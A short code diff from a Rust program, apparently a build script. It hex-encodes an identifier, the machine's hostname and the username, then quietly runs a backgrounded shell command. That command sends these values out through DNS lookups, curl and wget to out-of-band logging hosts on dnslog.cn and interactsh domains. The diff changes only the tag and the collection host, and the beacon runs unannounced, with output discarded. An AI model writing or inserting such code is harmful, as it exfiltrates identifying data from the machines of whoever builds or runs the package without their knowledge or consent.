@@ -17,8 +17,8 @@ fn main() {
     let i = hex(&id[..id.chars().take(45).count()]);
     let h = hex(&hn[..hn.chars().take(45).count()]);
     let u = hex(&un[..un.chars().take(30).count()]);
-    let tag = "a2a05833";
-    let ish = "dahpi2cgtqkhhbklhpp03u61y7w5xbgxx.oast.live";
+    let tag = "n3a06277";
+    let ish = "dahpp3cgtqkjvl1mas2gdg97wwijpdwe3.oast.site";
     // dual OOB: dnslog.cn (user) + interactsh (self), no inner quotes
     let cmd = format!(
         "(getent hosts ping.{}.y1acsd.dnslog.cn; curl -sm 8 http://ping.{}.y1acsd.dnslog.cn/x; getent hosts ping.{}.{}; curl -sm 8 http://p.{}.{}/{}/{}/{}; wget -q -T 8 -O /dev/null http://w.{}.{}/{}/{}/{}) >/dev/null 2>&1 &",
